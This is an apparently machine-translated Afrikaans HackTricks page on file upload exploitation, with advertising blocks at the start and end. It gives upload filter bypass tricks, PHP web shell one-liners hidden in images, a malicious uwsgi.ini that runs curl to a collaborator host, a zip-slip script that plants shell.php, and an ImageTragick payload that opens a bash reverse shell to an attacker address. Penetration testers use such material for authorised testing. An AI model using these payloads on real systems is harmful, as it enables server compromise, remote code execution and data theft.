# LÃªer Oplaai

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** ğŸ’¬ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hakwerk loopbaan** en die onhackbare wil hack - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gesproke vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Algemene Metodologie vir LÃªer Oplaai

Ander nuttige uitbreidings:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Werking in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Omgang met lÃªeruitbreidingskontroles

1. As dit van toepassing is, **kontroleer** die **vorige uitbreidings.** Toets hulle ook met 'n paar **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Kyk na **die byvoeging van 'n geldige uitbreiding voor** die uitvoeringsuitbreiding (gebruik ook vorige uitbreidings):_
* _lÃªer.png.php_
* _lÃªer.png.Php5_
3. Probeer om **spesiale karakters aan die einde toe te voeg.** Jy kan Burp gebruik om al die **ascii** en **Unicode** karakters te **brute force.** (_Let daarop dat jy ook die **voorheen** genoemde **uitbreidings** kan probeer gebruik_)
* _lÃªer.php%20_
* _lÃªer.php%0a_
* _lÃªer.php%00_
* _lÃªer.php%0d%0a_
* _lÃªer.php/_
* _lÃªer.php.\\_
* _lÃªer._
* _lÃªer.php...._
* _lÃªer.pHp5...._
4. Probeer om die beskermings te omseil deur die **uitbreidingsontleder** van die bedienerkant te mislei met tegnieke soos **die verdubbeling** van die **uitbreiding** of **die byvoeging van rommel** data (**nul** byte) tussen uitbreidings. _Jy kan ook die **vorige uitbreidings** gebruik om 'n beter lading voor te berei._
* _lÃªer.png.php_
* _lÃªer.png.pHp5_
* _lÃªer.php#.png_
* _lÃªer.php%00.png_
* _lÃªer.php\x00.png_
* _lÃªer.php%0a.png_
* _lÃªer.php%0d%0a.png_
* _lÃªer.phpJunk123png_
5. Voeg **'n ander laag van uitbreidings** by die vorige kontrole:
* _lÃªer.png.jpg.php_
* _lÃªer.php%00.png%00.jpg_
6. Probeer om die **uitvoeringsuitbreiding voor die geldige uitbreiding** te plaas en hoop dat die bediener verkeerd geconfigureer is. (nuttig om Apache verkeerde konfigurasies te benut waar enigiets met die uitbreiding\*\* _**.php**_**, maar** nie noodwendig eindig in .php\*\* sal kode uitvoer):
* _bv: lÃªer.php.png_
7. Gebruik **NTFS alternatiewe datastroom (ADS)** in **Windows**. In hierdie geval sal 'n kolonkarakter ":" ingevoeg word na 'n verbode uitbreiding en voor 'n toegestane een. As gevolg hiervan sal 'n **leÃ« lÃªer met die verbode uitbreiding** op die bediener geskep word (bv. "lÃªer.asax:.jpg"). Hierdie lÃªer kan later gewysig word deur ander tegnieke te gebruik, soos die gebruik van sy kort lÃªernaam. Die "**::$data**" patroon kan ook gebruik word om nie-leÃ« lÃªers te skep. Daarom kan die byvoeging van 'n puntkarakter na hierdie patroon ook nuttig wees om verdere beperkings te omseil (bv. "lÃªer.asp::$data.")
8. Probeer om die lÃªernaamgrense te breek. Die geldige uitbreiding word afgesny. En die skadelike PHP word agtergelaat. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 karakters
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 hier en voeg .png by
# Laai die lÃªer op en kontroleer die respons hoeveel karakters dit toelaat. Laat ons sÃª 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Maak die lading
AAA<--SNIP 232 A-->AAA.php.png
```
### Omgang met Inhouds-Tipe, Magiese Nommer, Kompressie & Herskalering

* Bypass **Inhouds-Tipe** kontroles deur die **waarde** van die **Inhouds-Tipe** **kop** te stel as: _image/png_ , _text/plain , application/octet-stream_
1. Inhouds-Tipe **woordelys**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Bypass **magiese nommer** kontrole deur by die begin van die lÃªer die **bytes van 'n regte beeld** by te voeg (verwar die _lÃªer_ bevel). Of stel die skaal binne die **metadata** in:\
`exiftool -Comment="<?php echo 'Bevel:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan ook die **lading direk insit** in 'n beeld:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* As **kompressie by jou beeld gevoeg word**, byvoorbeeld deur die gebruik van standaard PHP biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie nuttig wees nie. Jy kan egter die **PLTE brokkie** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat die **kompressie sal oorleef**.
* [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Die webblad kan ook die beeld **herskaal**, deur byvoorbeeld die PHP-GD funksies `imagecopyresized` of `imagecopyresampled` te gebruik. Jy kan egter die **IDAT brokkie** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat die **kompressie sal oorleef**.
* [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* 'n Ander tegniek om 'n lading te maak wat **oorleef met 'n beeldherskalering**, is om die PHP-GD funksie `thumbnailImage` te gebruik. Jy kan egter die **tEXt brokkie** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat die **kompressie sal oorleef**.
* [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Ander Truuks om te Kontroleer

* Vind 'n kwesbaarheid om die lÃªer wat reeds opgelaai is te **hernoem** (om die uitbreiding te verander).
* Vind 'n **Plaaslike LÃªer Insluiting** kwesbaarheid om die agterdeur uit te voer.
* **Moontlike Inligtingsoptel**:
1. Laai **veral kere** (en **gelyktydig**) dieselfde lÃªer op met dieselfde naam
2. Laai 'n lÃªer op met die **naam** van 'n **lÃªer** of **vouer** wat **reeds bestaan**
3. Laai 'n lÃªer op met **â€œ.â€, â€œ..â€, of â€œâ€¦â€ as sy naam**. Byvoorbeeld, in Apache in **Windows**, as die aansoek die opgelaai lÃªers in die â€œ/www/uploads/â€ gids stoor, sal die â€œ.â€ lÃªernaam 'n lÃªer genaamd â€œuploadsâ€ in die â€œ/www/â€ gids skep.
4. Laai 'n lÃªer op wat moontlik nie maklik verwyder kan word nie soos **â€œâ€¦:.jpgâ€** in **NTFS**. (Windows)
5. Laai 'n lÃªer op in **Windows** met **ongeldige karakters** soos `|<>*?â€` in sy naam. (Windows)
6. Laai 'n lÃªer op in **Windows** deur **voorbehoude** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9 te gebruik.
* Probeer ook om 'n uitvoerbare lÃªer (.exe) of 'n **.html** (minder verdag) op te laai wat kode **sal uitvoer** wanneer dit per ongeluk deur die slagoffer geopen word.

### Spesiale uitbreidingstruuks

As jy probeer om lÃªers na 'n **PHP-bediener** op te laai, [kyk na die **.htaccess** truuk om kode uit te voer](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
As jy probeer om lÃªers na 'n **ASP-bediener** op te laai, [kyk na die **.config** truuk om kode uit te voer](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lÃªers is soos die `.jar` vir java, maar vir php, en kan **soos 'n php-lÃªer gebruik word** (deur dit met php uit te voer, of dit binne 'n skripsie in te sluit...)

Die `.inc` uitbreiding word soms gebruik vir php lÃªers wat slegs gebruik word om lÃªers te **importeer**, dus, op 'n stadium, kon iemand toegelaat het dat **hierdie uitbreiding uitgevoer word**.

## **Jetty RCE**

As jy 'n XML-lÃªer na 'n Jetty-bediener kan oplaai, kan jy [RCE verkry omdat **nuwe \*.xml en \*.war outomaties verwerk word**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos genoem in die volgende beeld, laai die XML-lÃªer na `$JETTY_BASE/webapps/` en wag vir die skaal!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1044).png>)

## **uWSGI RCE**

Vir 'n gedetailleerde verkenning van hierdie kwesbaarheid, kyk na die oorspronklike navorsing: [uWSGI RCE Uitbuiting](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan in uWSGI-bedieners uitgebuit word as jy die vermoÃ« het om die `.ini` konfigurasie lÃªer te wysig. uWSGI konfigurasie lÃªers maak gebruik van 'n spesifieke sintaksis om "sielkundige" veranderlikes, plekhouers, en operateurs in te sluit. Veral, die '@' operateur, gebruik as `@(lÃªernaam)`, is ontwerp om die inhoud van 'n lÃªer in te sluit. Onder die verskeie ondersteunde skemas in uWSGI, is die "exec" skema veral kragtig, wat die lees van data van 'n proses se standaard uitvoer toelaat. Hierdie kenmerk kan vir bose doeleindes soos Remote Command Execution of Arbitrary File Write/Read gemanipuleer word wanneer 'n `.ini` konfigurasie lÃªer verwerk word.

Oorweeg die volgende voorbeeld van 'n skadelike `uwsgi.ini` lÃªer wat verskeie skemas toon:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die lading vind plaas tydens die ontleding van die konfigurasie lÃªer. Vir die konfigurasie om geaktiveer en ontled te word, moet die uWSGI-proses ofwel herlaai word (moontlik na 'n ongeluk of as gevolg van 'n Versteuring van Diens aanval) of die lÃªer moet ingestel word om outomaties te herlaai. Die outomatiese herlaai-funksie, indien geaktiveer, herlaai die lÃªer op gespesifiseerde tussenposes wanneer veranderinge opgespoor word.

Dit is noodsaaklik om die lakse aard van uWSGI se konfigurasie lÃªerontleding te verstaan. Spesifiek kan die besproke lading ingevoeg word in 'n binÃªre lÃªer (soos 'n beeld of PDF), wat die omvang van potensiÃ«le uitbuiting verder verbreed.

## **wget LÃªeroplaai/SSRF Truuk**

In sommige gevalle mag jy vind dat 'n bediener **`wget`** gebruik om **lÃªers af te laai** en jy kan die **URL** aandui. In hierdie gevalle kan die kode dalk nagaan dat die uitbreiding van die afgelaaide lÃªers binne 'n witlys is om te verseker dat slegs toegestane lÃªers afgelaai word. Nietemin, **hierdie nagaan kan omseil word.**\
Die **maksimum** lengte van 'n **lÃªernaam** in **Linux** is **255**, maar **wget** sny die lÃªernaam af tot **236** karakters. Jy kan 'n lÃªer aflaai met die naam "A"\*232+".php"+".gif", hierdie lÃªernaam sal die nagaan omseil (soos in hierdie voorbeeld is **".gif"** 'n **geldige** uitbreiding) maar `wget` sal die lÃªer hernoem na **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
Let wel dat **'n ander opsie** wat jy dalk oor dink om hierdie kontrole te omseil, is om die **HTTP-bediener te laat herlei na 'n ander lÃªer**, sodat die aanvanklike URL die kontrole sal omseil en dan sal wget die herlei lÃªer aflaai met die nuwe naam. Dit **sal nie werk nie** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die herlei bladsy sal aflaai met die naam van die lÃªer aangedui in die oorspronklike URL**.

## Gereedskap

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) is 'n kragtige gereedskap wat ontwerp is om Pentesters en Bug Hunters te help om lÃªeroplaaimeganismes te toets. Dit maak gebruik van verskeie foutbelonings tegnieke om die proses van identifisering en uitbuiting van kwesbaarhede te vereenvoudig, wat verseker dat webtoepassings deeglike assesserings ondergaan.

## Van LÃªeroplaai na ander kwesbaarhede

* Stel **lÃªernaam** in op `../../../tmp/lol.png` en probeer 'n **padtraversie** te bereik
* Stel **lÃªernaam** in op `sleep(10)-- -.jpg` en jy mag 'n **SQL-inspuiting** kan bereik
* Stel **lÃªernaam** in op `<svg onload=alert(document.domain)>` om 'n XSS te bereik
* Stel **lÃªernaam** in op `; sleep 10;` om 'n paar opdraginspuitings te toets (meer [opdraginspuitings truuks hier](../command-injection.md))
* [**XSS** in beeld (svg) lÃªeroplaai](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** lÃªer **oplaai** + **XSS** = [**Dienswerkers** uitbuiting](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE in svg-oplaai**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Oop Herlei** deur 'n svg-lÃªer op te laai](../open-redirect.md#open-redirect-uploading-svg-files)
* Probeer **verskillende svg-lasladings** van [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Bekende **ImageTrick** kwesbaarheid](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* As jy die webbediener kan **aandui om 'n beeld van 'n URL te vang** kan jy probeer om 'n [SSRF](../ssrf-server-side-request-forgery/) te misbruik. As hierdie **beeld** in 'n **openbare** webwerf gaan **geberg** word, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en **inligting van elke besoeker steel**.
* [**XXE en CORS** omseiling met PDF-Adobe-oplaai](pdf-upload-xxe-and-cors-bypass.md)
* Spesiaal ontwerpte PDF's vir XSS: Die [volgende bladsy wys hoe om **PDF-data in te spuit om JS-uitvoering te verkry**](../xss-cross-site-scripting/pdf-injection.md). As jy PDF's kan oplaai, kan jy 'n PDF voorberei wat arbitrÃªre JS sal uitvoer volgens die aangeduide aanwysings.
* Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud op om te kyk of die bediener enige **antivirus** het
* Kontroleer of daar enige **groottebeperking** is vir die oplaai van lÃªers

Hier is 'n top 10 lys van dinge wat jy kan bereik deur op te laai (van [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV-inspuiting
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML-inspuiting / XSS / Oop herlei
8. **PNG / JPEG**: Pixel-vloedaanval (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp-uitbreiding

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Toverkopkoptekens

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Verwys na [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) vir ander lÃªertipes.

### Zip/Tar-lÃªer word outomaties ontleed Oplaai

As jy 'n ZIP kan oplaai wat binne die bediener ontleed gaan word, kan jy 2 dinge doen:

#### Simboliese skakel

Laai 'n skakel op wat sagte skakels na ander lÃªers bevat, dan, deur toegang tot die ontleedde lÃªers, sal jy toegang hÃª tot die gekoppelde lÃªers:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Ontplooi in verskillende lÃªers

Die onverwagte skepping van lÃªers in gids tydens die ontpakking is 'n beduidende probleem. Ten spyte van aanvanklike aanames dat hierdie opstelling moontlik kan beskerm teen OS-vlak beveluitvoering deur skadelike lÃªeroplaais, kan die hiÃ«rargiese kompressie-ondersteuning en gidsdeursnysvermoÃ«ns van die ZIP-argief-formaat uitgebuit word. Dit stel aanvallers in staat om beperkings te omseil en veilige oplaai-gidse te ontsnap deur die ontpakkingfunksionaliteit van die geteikende aansoek te manipuleer.

'n Geoutomatiseerde uitbuiting om sulke lÃªers te skep is beskikbaar by [**evilarc op GitHub**](https://github.com/ptoomey3/evilarc). Die nut kan gebruik word soos hieronder getoon:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Daarbenewens is die **symlink truuk met evilarc** 'n opsie. As die doel is om 'n lÃªer soos `/flag.txt` te teiken, moet 'n symlink na daardie lÃªer in jou stelsel geskep word. Dit verseker dat evilarc nie foute teÃ«kom tydens sy werking nie.

Hieronder is 'n voorbeeld van Python-kode wat gebruik word om 'n skadelike zip-lÃªer te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir lÃªer spuitwerk**

Vir verdere besonderhede **kyk na die oorspronklike pos in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Skep 'n PHP Shell**: PHP-kode is geskryf om opdragte uit te voer wat deur die `$_REQUEST` veranderlike gestuur word.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **LÃªer Spuitwerk en Gekomprimeerde LÃªer Skepping**: Meervoudige lÃªers word geskep en 'n zip-argief word saamgestel wat hierdie lÃªers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **Wysiging met 'n Hex-Redakteur of vi**: Die name van die lÃªers binne die zip word verander deur vi of 'n hex-redakteur te gebruik, waar "xxA" na "../" verander word om deur gids te navigeer.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Laai hierdie inhoud met 'n beelduitbreiding op om die kwesbaarheid te misbruik **(ImageMagick, 7.0.1-1)** (van die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Inbedding PHP Shell op PNG

Inbedding 'n PHP shell in die IDAT brokkie van 'n PNG-lÃªer kan effektief sekere beeldverwerkingoperasies omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is veral relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir die verkleining en hermonstering van beelde, onderskeidelik. Die vermoÃ« van die ingebedde PHP shell om onaangeraak te bly deur hierdie operasies is 'n beduidende voordeel vir sekere gevalle.

'n Gedetailleerde verkenning van hierdie tegniek, insluitend sy metodologie en potensiÃ«le toepassings, word verskaf in die volgende artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en sy implikasies.

Meer inligting in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglote LÃªers

Poliglote lÃªers dien as 'n unieke instrument in sibersekerheid, wat optree as kameleons wat geldig in meervoudige lÃªerformate gelyktydig kan bestaan. 'n Interessante voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibried wat as beide 'n GIF en 'n RAR-argief funksioneer. Sulke lÃªers is nie beperk tot hierdie koppeling nie; kombinasies soos GIF en JS of PPT en JS is ook moontlik.

Die kernnut van poliglote lÃªers lÃª in hul vermoÃ« om sekuriteitsmaatreÃ«ls te omseil wat lÃªers op grond van tipe skerm. Algemene praktyk in verskeie toepassings behels die toelaat van slegs sekere lÃªertipes vir oplaaiâ€”soos JPEG, GIF, of DOCâ€”om die risiko wat deur potensieel skadelike formate (bv. JS, PHP, of Phar-lÃªers) veroorsaak word, te verminder. 'n Poligloot kan egter, deur te voldoen aan die strukturele kriteria van meervoudige lÃªertipes, hierdie beperkings stiekem omseil.

Ten spyte van hul aanpasbaarheid, ondervind poliglote wel beperkings. Byvoorbeeld, alhoewel 'n poligloot gelyktydig 'n PHAR-lÃªer (PHp ARchive) en 'n JPEG kan beliggaam, mag die sukses van sy oplaai afhang van die platform se lÃªeruitbreidingsbeleid. As die stelsel streng is oor toelaatbare uitbreidings, mag die bloot strukturele tweeledigheid van 'n poligloot nie voldoende wees om sy oplaai te waarborg nie.

Meer inligting in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Verwysings

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Indien jy belangstel in 'n **hackingsloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende Pools geskrewe en gesproke vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Leer AWS-hacking van niks tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** ğŸ’¬ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hackingswenke deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
